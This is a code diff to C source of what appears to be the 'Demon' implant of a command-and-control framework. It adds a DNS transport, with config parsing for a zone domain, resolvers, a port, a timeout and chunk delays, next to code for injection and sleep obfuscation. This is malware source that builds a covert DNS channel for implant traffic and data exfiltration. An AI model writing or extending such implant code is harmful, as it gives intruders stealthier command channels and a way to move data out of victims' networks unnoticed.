@@ -11,6 +11,7 @@
 #include <core/MiniStd.h>
 #include <core/SysNative.h>
 #include <core/Runtime.h>
+#include <core/TransportDns.h>
 
 /* Import Inject Headers */
 #include <inject/Inject.h>
@@ -321,6 +322,9 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             RtSspicli,
 #ifdef TRANSPORT_HTTP
             RtWinHttp,
+#endif
+#ifdef TRANSPORT_DNS
+            RtDnsApi,
 #endif
     };
 
@@ -861,6 +865,34 @@ VOID DemonConfig()
     }
     Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
 #endif
+
+#ifdef TRANSPORT_DNS
+    {
+        DWORD i;
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.DnsCtx.ZoneDomain = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.DnsCtx.ZoneDomain, Buffer, Length );
+        PRINTF( "[CONFIG] DNS ZoneDomain: %ls\n", Instance->Config.Transport.DnsCtx.ZoneDomain )
+
+        Instance->Config.Transport.DnsCtx.ResolverCount = (DWORD)ParserGetInt32( &Parser );
+        for ( i = 0; i < Instance->Config.Transport.DnsCtx.ResolverCount && i < 8; i++ )
+        {
+            Buffer = ParserGetBytes( &Parser, &Length );
+            Instance->Config.Transport.DnsCtx.Resolvers[ i ] = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+            MemCopy( Instance->Config.Transport.DnsCtx.Resolvers[ i ], Buffer, Length );
+        }
+
+        Instance->Config.Transport.DnsCtx.Port         = (WORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.QueryTimeout = (DWORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.ChunkDelayMs = (DWORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.SeqNum       = DNS_SEQ_INIT;
+
+        PRINTF( "[CONFIG] DNS Port=%d Timeout=%d ChunkDelay=%d\n",
+            (int)Instance->Config.Transport.DnsCtx.Port,
+            (int)Instance->Config.Transport.DnsCtx.QueryTimeout,
+            (int)Instance->Config.Transport.DnsCtx.ChunkDelayMs )
+    }
+#endif /* TRANSPORT_DNS */
 
     /* Start address for the Foliage sleep-obfuscation APC thread.
      *
